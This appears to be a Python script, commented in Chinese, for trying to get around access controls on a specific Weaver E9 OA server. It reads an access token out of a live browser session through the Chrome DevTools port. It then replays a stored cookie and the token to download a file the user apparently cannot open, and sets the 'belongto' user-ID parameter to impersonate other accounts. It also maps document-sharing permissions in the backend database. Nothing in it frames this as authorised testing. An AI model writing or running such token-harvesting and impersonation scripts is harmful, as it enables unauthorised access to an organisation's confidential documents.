# -*- coding: utf-8 -*-
"""最后一批绕过测试：localStorage.access_token、belongto 代理、DocShare 权限画像。

用法: python tools/e9_dl_lasttry.py
"""
from __future__ import annotations

import json
import os
import re
import sys
import urllib.request
from pathlib import Path

import pytds

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
import websocket  # noqa
from e9_attach_probe import call  # noqa
from e9_cdp_diag import call_tmo  # noqa

ROOT = Path(__file__).resolve().parent.parent
CK = ROOT / "data" / ".e9_cookie"
OA = "http://hc.hcipi.com:8088"
FID_BAD = 297063
RID = 1231910


def rows(cur, sql):
    cur.execute(sql)
    cols = [d[0] for d in cur.description]
    return [dict(zip(cols, r)) for r in cur.fetchall()]


def dl_test(path, cookie, tag):
    h = {"Cookie": cookie, "User-Agent": "Mozilla/5.0", "Referer": OA + "/wui/index.html"}
    try:
        rr = urllib.request.urlopen(urllib.request.Request(OA + path, headers=h), timeout=30)
        body = rr.read()
        is_html = body.lstrip()[:9].lower().startswith(b"<!doctype") or body.lstrip()[:5].lower().startswith(b"<html")
        if is_html:
            txt = re.sub(r"<[^>]+>", " ", body.decode("utf-8", "replace"))
            msg = re.sub(r"\s+", " ", txt).strip().replace("-->", "")[:40]
            print("  %-28s -> HTML %s" % (tag, msg))
        else:
            print("  %-28s -> 文件OK %s %d字节 %s" % (tag, rr.headers.get("Content-Type"), len(body), rr.headers.get("Content-Disposition")))
    except Exception as e:
        print("  %-28s -> 异常 %r" % (tag, e))


def main() -> int:
    sys.stdout.reconfigure(encoding="utf-8")
    cookie = CK.read_text(encoding="utf-8").strip()

    print("== 1. 浏览器 localStorage.access_token ==")
    token = None
    ver = json.loads(urllib.request.urlopen("http://127.0.0.1:9222/json/version", timeout=8).read())
    ws = websocket.create_connection(ver["webSocketDebuggerUrl"], timeout=20)
    targets = [t for t in call(ws, "Target.getTargets")["targetInfos"]
               if t["type"] == "page" and "hc.hcipi.com" in t["url"]]
    for t in targets:
        sid = call(ws, "Target.attachToTarget", {"targetId": t["targetId"], "flatten": True})["sessionId"]
        r = call_tmo(ws, "Runtime.evaluate",
                     {"expression": "JSON.stringify({token: localStorage.access_token || null, keys: Object.keys(localStorage).slice(0,20)})",
                      "returnByValue": True}, sid, tmo=8)
        if r != "__TIMEOUT__":
            v = r["result"]["result"].get("value")
            print("  [%s] %s" % (t["url"][:50], v))
            if v:
                d = json.loads(v)
                if d.get("token"):
                    token = d["token"]
                    break
        else:
            print("  [%s] eval 超时" % t["url"][:50])
    ws.close()

    print()
    print("== 2. FileDownload 绕过参数实测（fileid=%d）==" % FID_BAD)
    dl_test("/weaver/weaver.file.FileDownload?fileid=%d" % FID_BAD, cookie, "裸 fileid")
    if token:
        dl_test("/weaver/weaver.file.FileDownload?fileid=%d&access_token=%s" % (FID_BAD, token), cookie, "+access_token")
        dl_test("/weaver/weaver.file.FileDownload?fileid=%d&access_token=%s" % (FID_BAD, token), "", "+access_token 无Cookie")
    for uid in (1, 87, 452, 69):
        dl_test("/weaver/weaver.file.FileDownload?fileid=%d&download=1&fromrequest=1&requestid=%d"
                "&f_weaver_belongto_userid=%d&f_weaver_belongto_usertype=0" % (FID_BAD, RID, uid),
                cookie, "belongto=%d" % uid)

    print()
    print("== 3. 权限画像：这些密级类别的共享/角色 ==")
    conn = pytds.connect(
        dsn=os.environ["DB_HOST"], port=int(os.environ.get("DB_PORT", "1433")),
        user=os.environ["DB_USER"], password=os.environ["DB_PWD_READONLY"],
        database="ecologyE9", timeout=60, login_timeout=60)
    cur = conn.cursor()
    # 找 SecCategory 类表
    tabs = rows(cur, ("SELECT TABLE_NAME AS t FROM INFORMATION_SCHEMA.TABLES "
                      "WHERE TABLE_NAME LIKE '%ecategor%' OR TABLE_NAME LIKE '%SecCateg%'"))
    print("  类别表:", [t["t"] for t in tabs])
    for t in tabs:
        try:
            rr = rows(cur, ("SELECT TOP 6 * FROM [%s] WHERE id IN (5,20,45,1112,1156,1398,1503)") % t["t"])
            for r in rr:
                keep = {k: v for k, v in r.items() if v not in (None, "", 0) and "mould" not in k.lower()}
                print("   [%s] %s" % (t["t"], {k: keep[k] for k in list(keep)[:12]}))
        except Exception:
            conn.rollback()
    # DocShare：谁共享了这些文档
    for did in (156655, 155287):
        try:
            rr = rows(cur, "SELECT TOP 8 * FROM DocShare WHERE docid=%d" % did)
            print("  DocShare doc=%d: %s" % (did, rr))
        except Exception as e:
            conn.rollback()
            print("  DocShare 查询失败:", str(e)[:80])
    conn.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
